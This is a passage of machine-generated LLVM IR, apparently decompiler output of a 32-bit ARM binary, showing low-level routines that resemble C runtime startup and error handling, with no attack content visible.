  br i1 %v7_13508, label %dec_label_pc_13510, label %.backedge3

dec_label_pc_13510:                               ; preds = %dec_label_pc_13504
  %v1_13510 = add i32 %v2_134e8, 3
  %v2_13510 = inttoptr i32 %v1_13510 to i8*
  %v3_13510 = load i8, i8* %v2_13510, align 1
  %v4_13510 = zext i8 %v3_13510 to i32
  %v0_13514 = load i32, i32* @r4, align 4
  %v1_13514 = load i32, i32* @sl, align 4
  %v2_13514 = add i32 %v1_13514, %v0_13514
  %v3_13514 = inttoptr i32 %v2_13514 to i32*
  %v4_13514 = load i32, i32* %v3_13514, align 4
  %v2_13518 = mul nuw nsw i32 %v4_13510, 2
  %v2_1351c = add i32 %v4_13514, %v2_13518
  %v3_1351c = inttoptr i32 %v2_1351c to i16*
  %v4_1351c = load i16, i16* %v3_1351c, align 2
  %v1_13520 = and i16 %v4_1351c, 8
  %v2_13520 = icmp eq i16 %v1_13520, 0
  br i1 %v2_13520, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_13510
  %v1_13524 = load i32, i32* @r5, align 4
  %v2_13524 = add i32 %v1_13524, 1
  store i32 %v2_13524, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_13510, %dec_label_pc_134e4, %dec_label_pc_134f8, %dec_label_pc_13504
  %v0_13528.pre = load i32, i32* @r6, align 4
  %v0_13534.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_134d0
  %v0_13534 = phi i32 [ %v0_13534.pre, %.backedge3 ], [ ptrtoint (i32* @global_var_16914.421 to i32), %dec_label_pc_134d0 ]
  %v0_13528 = phi i32 [ %v0_13528.pre, %.backedge3 ], [ %v2_134c4, %dec_label_pc_134d0 ]
  %v4_13538 = inttoptr i32 %v0_13528 to i32*
  %v5_13538 = call i32 @function_1478c(i32* %v4_13538, i32 %v2_134dc, i32 258, i32 %v0_13534)
  %v2_1353c = icmp eq i32 %v5_13538, 0
  br i1 %v2_1353c, label %dec_label_pc_135ac, label %dec_label_pc_134e4

dec_label_pc_13548:                               ; preds = %dec_label_pc_134a4
  store i32 ptrtoint ([14 x i8]* @global_var_16918.424 to i32), i32* @r0, align 4
  %v2_13550 = call i32 @function_14ae8(i32 ptrtoint ([14 x i8]* @global_var_16918.424 to i32))
  store i32 %v2_13550, i32* @r6, align 4
  %v2_13554 = icmp eq i32 %v2_13550, 0
  br i1 %v2_13554, label %bb19, label %dec_label_pc_13560

bb19:                                             ; preds = %dec_label_pc_13548
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_135ac

dec_label_pc_13560:                               ; preds = %dec_label_pc_13548
  store i32 ptrtoint ([10 x i8]* @global_var_16928.426 to i32), i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1694c.428 to i32), i32* @r7, align 4
  %v2_13570 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13570, i32* @r4, align 4
  br label %bb21

dec_label_pc_13578:                               ; preds = %bb21
  %v0_135a4 = load i32, i32* @r8, align 4
  %v1_135a4 = inttoptr i32 %v0_135a4 to i8*
  %v3_13578 = load i32, i32* %stack_var_-36, align 4
  %v1_1357c = inttoptr i32 %v3_13578 to i32*
  %v2_1357c = load i32, i32* %v1_1357c, align 4
  store i32 %v2_1357c, i32* @r1, align 4
  %v4_13580 = call i32 @function_15da0(i8* %v1_135a4, i32 %v2_1357c)
  %v2_13584 = icmp eq i32 %v4_13580, 0
  br i1 %v2_13584, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_13578
  %v1_13588 = load i32, i32* @r5, align 4
  %v2_13588 = add i32 %v1_13588, 1
  store i32 %v2_13588, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_13578
  %v0_13594.pre = load i32, i32* @r7, align 4
  %v0_13598.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_13560
  %v0_13598 = phi i32 [ %v0_13598.pre, %.backedge ], [ %v2_13550, %dec_label_pc_13560 ]
  %v0_13594 = phi i32 [ %v0_13594.pre, %.backedge ], [ ptrtoint (i32* @global_var_1694c.428 to i32), %dec_label_pc_13560 ]
  %v4_1359c = inttoptr i32 %v0_13598 to i32*
  %v5_1359c = call i32 @function_1478c(i32* %v4_1359c, i32 %v2_13570, i32 459266, i32 %v0_13594)
  %v2_135a0 = icmp eq i32 %v5_1359c, 0
  br i1 %v2_135a0, label %dec_label_pc_135ac, label %dec_label_pc_13578

dec_label_pc_135ac:                               ; preds = %bb18, %bb21, %bb19
  %v0_135ac = load i32, i32* @r6, align 4
  %v1_135b0 = inttoptr i32 %v0_135ac to i32*
  %v2_135b0 = call i32 @function_14ab4(i32* %v1_135b0)
  %v0_135b4 = load i32, i32* @r5, align 4
  %v2_135b4 = icmp eq i32 %v0_135b4, 0
  %.v0_135b4 = select i1 %v2_135b4, i32 1, i32 %v0_135b4
  ret i32 %.v0_135b4

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @function_14ae8, { 1, 0 }
  uselistorder label %dec_label_pc_135ac, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @function_135f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_135f0:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_139d8

bb:                                               ; preds = %dec_label_pc_135f0
  %v7_13604 = mul i32 %arg1, 4
  %v8_13604 = add i32 %v7_13604, ptrtoint (i32* @global_var_1360c.431 to i32)
  call void @__pseudo_branch(i32 %v8_13604)
  br label %dec_label_pc_139d8

dec_label_pc_139d8:                               ; preds = %bb, %dec_label_pc_135f0
  %v0_139d8 = call i32 @function_11734()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_139e4 = inttoptr i32 %v0_139d8 to i32*
  store i32 22, i32* %v2_139e4, align 4
  %v0_13b94 = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_13b94

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_13c0c() local_unnamed_addr {
dec_label_pc_13c30.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13c0c = load i32, i32* @r4, align 4
  store i32 %v3_13c0c, i32* %stack_var_-16, align 4
  store i32 126984, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13c30

dec_label_pc_13c30:                               ; preds = %dec_label_pc_13c30.dec_label_pc_13c30_crit_edge, %dec_label_pc_13c30.lr.ph
  %v1_13c30 = phi i32 [ %v1_13c3c, %dec_label_pc_13c30.dec_label_pc_13c30_crit_edge ], [ 0, %dec_label_pc_13c30.lr.ph ]
  %v0_13c30 = phi i32 [ %v0_13c30.pre, %dec_label_pc_13c30.dec_label_pc_13c30_crit_edge ], [ 126984, %dec_label_pc_13c30.lr.ph ]
  %v4_13c30 = mul i32 %v1_13c30, 4
  %v5_13c30 = add i32 %v4_13c30, %v0_13c30
  %v6_13c30 = inttoptr i32 %v5_13c30 to i32*
  %v7_13c30 = load i32, i32* %v6_13c30, align 4
  call void @__pseudo_branch(i32 %v7_13c30)
  %v0_13c3c = load i32, i32* %r4.global-to-local, align 4
  %v1_13c3c = add i32 %v0_13c3c, -1
  store i32 %v1_13c3c, i32* %r4.global-to-local, align 4
  %v2_13c3c = icmp eq i32 %v0_13c3c, 0
  br i1 %v2_13c3c, label %dec_label_pc_13c44, label %dec_label_pc_13c30.dec_label_pc_13c30_crit_edge

dec_label_pc_13c30.dec_label_pc_13c30_crit_edge:  ; preds = %dec_label_pc_13c30
  %v0_13c30.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13c30

dec_label_pc_13c44:                               ; preds = %dec_label_pc_13c30
  %v4_13c48 = load i32, i32* @global_var_1f2bc.444, align 4
  %v2_13c4c = icmp eq i32 %v4_13c48, 0
  br i1 %v2_13c4c, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_13c44
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_13c44, %bb
  %v2_13c54 = xor i1 %v2_13c4c, true
  call void @__pseudo_cond_branch(i1 %v2_13c54, i32 %v4_13c48)
  %v4_13c5c = load i32, i32* @global_var_1f2c0.446, align 4
  %v2_13c60 = icmp eq i32 %v4_13c5c, 0
  br i1 %v2_13c60, label %bb18, label %bb17

bb17:                                             ; preds = %bb16
  br label %bb18

bb18:                                             ; preds = %bb16, %bb17
  %v2_13c68 = xor i1 %v2_13c60, true
  call void @__pseudo_cond_branch(i1 %v2_13c68, i32 %v4_13c5c)
  %v2_13c6c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13c6c, i32* %r4.global-to-local, align 4
  %v1_13c70 = load i32, i32* @r0, align 4
  ret i32 %v1_13c70

; uselistorder directives
  uselistorder i32 %v1_13c3c, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_13c88(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13c88:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_13c9c = call i32 @function_11140(i32 %arg1, i32 1)
  %v3_13ca4 = icmp eq i32 %v2_13c9c, -1
  store i32 126992, i32* @r3, align 4
  br i1 %v3_13ca4, label %dec_label_pc_13cb0, label %dec_label_pc_13cc8

dec_label_pc_13cb0:                               ; preds = %dec_label_pc_13c88
  %v0_13cb4 = load i32, i32* %r5.global-to-local, align 4
  %v3_13cbc = call i32 @function_10f18(i32 ptrtoint ([10 x i8]* @global_var_16950.449 to i32), i32 %v0_13cb4)
  %v1_13cc0 = load i32, i32* %r4.global-to-local, align 4
  %v1_13cc4 = icmp ne i32 %v3_13cbc, %v1_13cc0
  call void @__pseudo_cond_branch(i1 %v1_13cc4, i32 ptrtoint (i32* @global_var_1301c.450 to i32))
  br label %dec_label_pc_13cc8

dec_label_pc_13cc8:                               ; preds = %dec_label_pc_13c88, %dec_label_pc_13cb0
  %v1_13cd0 = phi i32 [ %v2_13c9c, %dec_label_pc_13c88 ], [ %v3_13cbc, %dec_label_pc_13cb0 ]
  ret i32 %v1_13cd0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_13cc8, { 1, 0 }
}

define i32 @function_13cdc(i32 %arg1) local_unnamed_addr {
dec_label_pc_13cdc:
  %r4.global-to-local = alloca i32, align 4
  store i32 126992, i32* %r4.global-to-local, align 4
  %v4_13cec = load i32, i32* inttoptr (i32 127084 to i32*), align 4
  %v1_13cf0 = inttoptr i32 %v4_13cec to i32*
  %v2_13cf0 = load i32, i32* %v1_13cf0, align 4
  %v2_13cf4 = icmp eq i32 %v2_13cf0, 0
  br i1 %v2_13cf4, label %dec_label_pc_13cfc, label %dec_label_pc_13d30

dec_label_pc_13cfc:                               ; preds = %dec_label_pc_13cdc
  %v4_13d00 = load i32, i32* inttoptr (i32 127044 to i32*), align 4
  %v2_13d08 = icmp eq i32 %v4_13d00, 0
  store i32 4096, i32* %v1_13cf0, align 4
  br i1 %v2_13d08, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_13cfc
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_13cfc, %bb
  %v2_13d14 = xor i1 %v2_13d08, true
  call void @__pseudo_cond_branch(i1 %v2_13d14, i32 %v4_13d00)
  %v0_13d1c = load i32, i32* %r4.global-to-local, align 4
  %v2_13d24 = icmp eq i32 %v0_13d1c, 40964
  br i1 %v2_13d24, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v2_13d2c = xor i1 %v2_13d24, true
  call void @__pseudo_cond_branch(i1 %v2_13d2c, i32 ptrtoint (i32* @global_var_1500c.455 to i32))
  br label %dec_label_pc_13d30

dec_label_pc_13d30:                               ; preds = %dec_label_pc_13cdc, %bb6
  %v1_13d34 = load i32, i32* @r0, align 4
  ret i32 %v1_13d34

; uselistorder directives
  uselistorder i1 %v2_13d24, { 1, 0 }
  uselistorder label %dec_label_pc_13d30, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_13d48(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_13d48:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %tmp49 = call i32 @__decompiler_undefined_function_0()
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r7, align 4
  %v1_13d50 = add i32 %tmp, 4
  store i32 %v1_13d50, i32* %ip.global-to-local, align 4
  %v2_13d54 = load i32, i32* %arg3, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 126992, i32* @r6, align 4
  %v3_13d60 = mul i32 %arg2, 4
  store i32 %v3_13d60, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v4_13d68 = load i32, i32* inttoptr (i32 127012 to i32*), align 4
  store i32 28, i32* %r2.global-to-local, align 4
  %v2_13d70 = ptrtoint i32* %stack_var_-120 to i32
  %v4_13d74 = load i32, i32* inttoptr (i32 127020 to i32*), align 4
  store i32 %v4_13d74, i32* %r4.global-to-local, align 4
  %v2_13d7c = add i32 %v1_13d50, %v3_13d60
  store i32 %v2_13d7c, i32* %ip.global-to-local, align 4
  %v9_13d80 = icmp eq i32 %v2_13d7c, %v2_13d54
  store i1 %v9_13d80, i1* %cpsr_z.global-to-local, align 1
  %v2_13d84 = inttoptr i32 %v4_13d68 to i32*
  store i32 %arg7, i32* %v2_13d84, align 4
  store i32 688, i32* %r2.global-to-local, align 4
  %v0_13d90 = load i32, i32* %r3.global-to-local, align 4
  br i1 %v9_13d80, label %bb, label %.critedge

bb:                                               ; preds = %dec_label_pc_13d48
  %v1_13d94 = load i32, i32* @r7, align 4
  %v2_13d94 = load i32, i32* %r5.global-to-local, align 4
  %v3_13d94 = add i32 %v2_13d94, %v1_13d94
  store i32 %v3_13d94, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @global_var_1f2c0.446, align 4
  %v0_13d9c = load i32, i32* %ip.global-to-local, align 4
  %v1_13d9c = load i32, i32* %r4.global-to-local, align 4
  %v2_13d9c = inttoptr i32 %v1_13d9c to i32*
  store i32 %v0_13d9c, i32* %v2_13d9c, align 4
  store i32 120, i32* @r2, align 4
  %v1_13da8 = load i32, i32* %r3.global-to-local, align 4
  %v2_13da8 = load i32, i32* %r4.global-to-local, align 4
  %v3_13da8 = inttoptr i32 %v2_13da8 to i32*
  store i32 %v1_13da8, i32* %v3_13da8, align 4
  br label %bb57

.critedge:                                        ; preds = %dec_label_pc_13d48
  store i32 %arg6, i32* @global_var_1f2c0.446, align 4
  %v0_13d9c.c = load i32, i32* %ip.global-to-local, align 4
  %v1_13d9c.c = load i32, i32* %r4.global-to-local, align 4
  %v2_13d9c.c = inttoptr i32 %v1_13d9c.c to i32*
  store i32 %v0_13d9c.c, i32* %v2_13d9c.c, align 4
  store i32 120, i32* @r2, align 4
  br label %bb57

bb57:                                             ; preds = %.critedge, %bb
  %v2_13db4 = bitcast i32* %stack_var_-120 to i8*
  %v3_13db4 = call i32 @function_11790(i8* %v2_13db4, i32 0)
  %v0_13db8 = load i32, i32* %r4.global-to-local, align 4
  %v1_13db8 = inttoptr i32 %v0_13db8 to i32*
  %storemerge.pre = load i32, i32* %v1_13db8, align 4
  br label %dec_label_pc_13dc4

dec_label_pc_13dc4:                               ; preds = %dec_label_pc_13dc4, %bb57
  %storemerge = phi i32 [ %storemerge.pre, %bb57 ], [ %v4_13dc4, %dec_label_pc_13dc4 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_13dc4 = inttoptr i32 %storemerge to i32*
  %v2_13dc4 = load i32, i32* %v1_13dc4, align 4
  store i32 %v2_13dc4, i32* %r3.global-to-local, align 4
  %v4_13dc4 = add i32 %storemerge, 4
  store i32 %v4_13dc4, i32* %r2.global-to-local, align 4
  %v2_13dc8 = icmp eq i32 %v2_13dc4, 0
  br i1 %v2_13dc8, label %dec_label_pc_13dd4, label %dec_label_pc_13dc4

dec_label_pc_13dd4:                               ; preds = %dec_label_pc_13dc4
  store i32 %v4_13dc4, i32* @r4, align 4
  store i32 %v2_13d70, i32* @r5, align 4
  %v1_13df829 = inttoptr i32 %v4_13dc4 to i32*
  %v2_13df830 = load i32, i32* %v1_13df829, align 4
  store i32 %v2_13df830, i32* %r3.global-to-local, align 4
  %v2_13dfc32 = icmp eq i32 %v2_13df830, 0
  store i1 %v2_13dfc32, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13dfc32, label %dec_label_pc_13e04, label %dec_label_pc_13de0

dec_label_pc_13de0:                               ; preds = %dec_label_pc_13dd4, %dec_label_pc_13df8
  %v5_13de4 = phi i32 [ %v2_13df8, %dec_label_pc_13df8 ], [ %v2_13df830, %dec_label_pc_13dd4 ]
  %v2_13de0 = icmp ugt i32 %v5_13de4, 13
  %v7_13de0 = icmp eq i32 %v5_13de4, 14
  store i1 %v7_13de0, i1* %cpsr_z.global-to-local, align 1
  %v2_13de4 = xor i1 %v2_13de0, true
  %v3_13de4 = or i1 %v7_13de0, %v2_13de4
  br i1 %v3_13de4, label %bb58, label %bb59

bb58:                                             ; preds = %dec_label_pc_13de0
  %v6_13de4 = and i32 %v5_13de4, 536870912
  %v7_13de4 = icmp ne i32 %v6_13de4, 0
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_13de0, %bb58
  %v1_13df0 = phi i1 [ %v2_13de0, %dec_label_pc_13de0 ], [ %v7_13de4, %bb58 ]
  %v2_13de8 = xor i1 %v1_13df0, true
  %v3_13de8 = or i1 %v7_13de0, %v2_13de8
  br i1 %v3_13de8, label %bb60, label %dec_label_pc_13df8

bb60:                                             ; preds = %bb59
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13df8

dec_label_pc_13df8:                               ; preds = %bb59, %bb60
  call void @__pseudo_cond_branch(i1 %v3_13de8, i32 ptrtoint (i32* @global_var_11840.460 to i32))
  %v0_13df4 = load i32, i32* @r4, align 4
  %v1_13df4 = add i32 %v0_13df4, 8
  store i32 %v1_13df4, i32* @r4, align 4
  %v1_13df8 = inttoptr i32 %v1_13df4 to i32*
  %v2_13df8 = load i32, i32* %v1_13df8, align 4
  store i32 %v2_13df8, i32* %r3.global-to-local, align 4
  %v2_13dfc = icmp eq i32 %v2_13df8, 0
  store i1 %v2_13dfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13dfc, label %dec_label_pc_13e04, label %dec_label_pc_13de0

dec_label_pc_13e04:                               ; preds = %dec_label_pc_13df8, %dec_label_pc_13dd4
  %v1_13e08 = call i32 @function_16214(i32 %v2_13d70)
  store i32 %v1_13e08, i32* @r0, align 4
  %v1_13e0c = call i32 @function_13cdc(i32 %v1_13e08)
  store i32 %v1_13e0c, i32* @r0, align 4
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* @r2, align 4
  %v0_13e18 = load i32, i32* @r6, align 4
  %v2_13e18 = add i32 %v0_13e18, 92
  %v3_13e18 = inttoptr i32 %v2_13e18 to i32*
  %v4_13e18 = load i32, i32* %v3_13e18, align 4
  store i32 %tmp52, i32* @r3, align 4
  %v2_13e20 = icmp eq i32 %tmp53, 0
  store i1 %v2_13e20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13e20, label %bb61, label %bb62

bb61:                                             ; preds = %dec_label_pc_13e04
  store i32 4096, i32* @r2, align 4
  br label %bb62

bb62:                                             ; preds = %dec_label_pc_13e04, %bb61
  %v0_13e2c = phi i32 [ %tmp53, %dec_label_pc_13e04 ], [ 4096, %bb61 ]
  %v3_13e28 = icmp eq i32 %tmp52, -1
  %v8_13e28 = icmp eq i32 %tmp52, -1
  store i1 %v8_13e28, i1* %cpsr_z.global-to-local, align 1
  %v2_13e2c = inttoptr i32 %v4_13e18 to i32*
  store i32 %v0_13e2c, i32* %v2_13e2c, align 4
  br i1 %v3_13e28, label %dec_label_pc_13e34, label %dec_label_pc_13e5c

dec_label_pc_13e34:                               ; preds = %bb62
  %v0_13e34 = call i32 @function_1414c()
  store i32 %v0_13e34, i32* @r0, align 4
  store i32 %v0_13e34, i32* @r4, align 4
  %v0_13e3c = call i32 @function_141a8()
  store i32 %v0_13e3c, i32* @r0, align 4
  %v0_13e40 = load i32, i32* @r4, align 4
  %v9_13e40 = icmp eq i32 %v0_13e40, %v0_13e3c
  store i1 %v9_13e40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13e40, label %dec_label_pc_13e48, label %dec_label_pc_13e84

dec_label_pc_13e48:                               ; preds = %dec_label_pc_13e34
  %v1_13e48 = call i32 @function_14314(i32 %v0_13e3c)
  store i32 %v1_13e48, i32* @r0, align 4
  store i32 %v1_13e48, i32* @r4, align 4
  %v0_13e50 = call i32 @function_14194()
  store i32 %v0_13e50, i32* @r0, align 4
  %v0_13e54 = load i32, i32* @r4, align 4
  %v9_13e54 = icmp eq i32 %v0_13e54, %v0_13e50
  store i1 %v9_13e54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13e54, label %dec_label_pc_13e5c, label %dec_label_pc_13e84

dec_label_pc_13e5c:                               ; preds = %dec_label_pc_13e48, %bb62
  store i32 %tmp52, i32* @r2, align 4
  store i1 %v8_13e28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_13e28, label %dec_label_pc_13ea8, label %dec_label_pc_13e68

dec_label_pc_13e68:                               ; preds = %dec_label_pc_13e5c
  store i32 %tmp51, i32* @r3, align 4
  %v9_13e6c = icmp eq i32 %tmp52, %tmp51
  store i1 %v9_13e6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13e6c, label %dec_label_pc_13e74, label %dec_label_pc_13e84

dec_label_pc_13e74:                               ; preds = %dec_label_pc_13e68
  store i32 %tmp50, i32* @r2, align 4
  store i32 %tmp49, i32* @r3, align 4
  %v9_13e7c = icmp eq i32 %tmp50, %tmp49
  store i1 %v9_13e7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13e7c, label %dec_label_pc_13ea8, label %dec_label_pc_13e84

dec_label_pc_13e84:                               ; preds = %dec_label_pc_13e68, %dec_label_pc_13e48, %dec_label_pc_13e34, %dec_label_pc_13e74
  %v2_13e8c = call i32 @function_13c88(i32 0, i32 32768)
  %v2_13e98 = call i32 @function_13c88(i32 1, i32 32770)
  %v2_13ea4 = call i32 @function_13c88(i32 2, i32 32770)
  store i32 %v2_13ea4, i32* @r0, align 4
  br label %dec_label_pc_13ea8

dec_label_pc_13ea8:                               ; preds = %dec_label_pc_13e74, %dec_label_pc_13e5c, %dec_label_pc_13e84
  %v0_13ea8 = load i32, i32* @r7, align 4
  %v1_13ea8 = inttoptr i32 %v0_13ea8 to i32*
  %v2_13ea8 = load i32, i32* %v1_13ea8, align 4
  store i32 %v2_13ea8, i32* %r2.global-to-local, align 4
  store i32 208, i32* %r3.global-to-local, align 4
  %v1_13eb0 = load i32, i32* @r6, align 4
  %v3_13eb0 = add i32 %v1_13eb0, 208
  %v4_13eb0 = inttoptr i32 %v3_13eb0 to i32*
  store i32 %v2_13ea8, i32* %v4_13eb0, align 4
  %v0_13eb4 = load i32, i32* @r7, align 4
  %v1_13eb4 = inttoptr i32 %v0_13eb4 to i32*
  %v2_13eb4 = load i32, i32* %v1_13eb4, align 4
  store i32 %v2_13eb4, i32* @r4, align 4
  %v2_13eb8 = icmp eq i32 %v2_13eb4, 0
  store i1 %v2_13eb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13eb8, label %dec_label_pc_13f5c.lr.ph, label %dec_label_pc_13ec0

dec_label_pc_13ec0:                               ; preds = %dec_label_pc_13ea8
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_13ec4 = load i32, i32* @r6, align 4
  %v2_13ec4 = add i32 %v0_13ec4, 112
  %v3_13ec4 = inttoptr i32 %v2_13ec4 to i32*
  %v4_13ec4 = load i32, i32* %v3_13ec4, align 4
  store i32 %v4_13ec4, i32* %r3.global-to-local, align 4
  %v2_13ec8 = inttoptr i32 %v4_13ec4 to i32*
  store i32 %v2_13eb4, i32* %v2_13ec8, align 4
  %v0_13ed0 = load i32, i32* @r7, align 4
  %v1_13ed0 = inttoptr i32 %v0_13ed0 to i32*
  %v2_13ed0 = load i32, i32* %v1_13ed0, align 4
  %v4_13ed4 = call i32 @function_15e50(i32 %v2_13ed0, i32 47, i32 %v2_13ea8, i32 %v4_13ec4)
  store i32 %v4_13ed4, i32* @r0, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v2_13edc = icmp eq i32 %v4_13ed4, 0
  store i1 %v2_13edc, i1* %cpsr_z.global-to-local, align 1
  %v0_13ee0 = load i32, i32* @r6, align 4
  %v2_13ee0 = add i32 %v0_13ee0, 60
  %v3_13ee0 = inttoptr i32 %v2_13ee0 to i32*
  %v4_13ee0 = load i32, i32* %v3_13ee0, align 4
  store i32 %v4_13ee0, i32* %r2.global-to-local, align 4
  br i1 %v2_13edc, label %.thread46, label %bb63

.thread46:                                        ; preds = %dec_label_pc_13ec0
  %v2_13ee847 = inttoptr i32 %v4_13ee0 to i32*
  store i32 0, i32* %v2_13ee847, align 4
  br label %dec_label_pc_13f5c.lr.ph

bb63:                                             ; preds = %dec_label_pc_13ec0
  %v2_13ee4 = add i32 %v4_13ed4, 1
  store i32 %v2_13ee4, i32* %r3.global-to-local, align 4
  %v2_13ee8 = inttoptr i32 %v4_13ee0 to i32*
  store i32 %v4_13ed4, i32* %v2_13ee8, align 4
  %v1_13eec = load i32, i32* %r3.global-to-local, align 4
  %v2_13eec = load i32, i32* %r2.global-to-local, align 4
  %v3_13eec = inttoptr i32 %v2_13eec to i32*
  store i32 %v1_13eec, i32* %v3_13eec, align 4
  br label %dec_label_pc_13f5c.lr.ph

dec_label_pc_13f5c.lr.ph:                         ; preds = %.thread46, %bb63, %dec_label_pc_13ea8
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_13f04 = load i32, i32* @r6, align 4
  %v2_13f04 = add i32 %v0_13f04, -12
  store i32 %v2_13f04, i32* %r8.global-to-local, align 4
  store i32 684, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %arg5, i32* @global_var_1f2bc.444, align 4
  %v2_13f34 = icmp eq i32 %v0_13d90, 0
  store i1 %v2_13f34, i1* %cpsr_z.global-to-local, align 1
  %v2_13f3c = xor i1 %v2_13f34, true
  call void @__pseudo_cond_branch(i1 %v2_13f3c, i32 %v0_13d90)
  store i32 -12, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  %v0_13f50 = load i32, i32* @r6, align 4
  %v2_13f50 = add i32 %v0_13f50, -12
  store i32 %v2_13f50, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13f5c

dec_label_pc_13f5c:                               ; preds = %dec_label_pc_13f5c.dec_label_pc_13f5c_crit_edge, %dec_label_pc_13f5c.lr.ph
  %v1_13f5c = phi i32 [ %v1_13f68, %dec_label_pc_13f5c.dec_label_pc_13f5c_crit_edge ], [ 0, %dec_label_pc_13f5c.lr.ph ]
  %v0_13f5c = phi i32 [ %v0_13f5c.pre, %dec_label_pc_13f5c.dec_label_pc_13f5c_crit_edge ], [ %v2_13f50, %dec_label_pc_13f5c.lr.ph ]
  %v4_13f5c = mul i32 %v1_13f5c, 4
  %v5_13f5c = add i32 %v4_13f5c, %v0_13f5c
  %v6_13f5c = inttoptr i32 %v5_13f5c to i32*
  %v7_13f5c = load i32, i32* %v6_13f5c, align 4
  store i32 %v7_13f5c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_13f5c)
  %v0_13f68 = load i32, i32* %r4.global-to-local, align 4
  %v1_13f68 = add i32 %v0_13f68, 1
  store i32 %v1_13f68, i32* %r4.global-to-local, align 4
  %v1_13f6c = load i32, i32* %r5.global-to-local, align 4
  %v3_13f6c = icmp ult i32 %v1_13f68, %v1_13f6c
  %v9_13f6c = icmp eq i32 %v1_13f68, %v1_13f6c
  store i1 %v9_13f6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13f6c, label %dec_label_pc_13f5c.dec_label_pc_13f5c_crit_edge, label %dec_label_pc_13f74

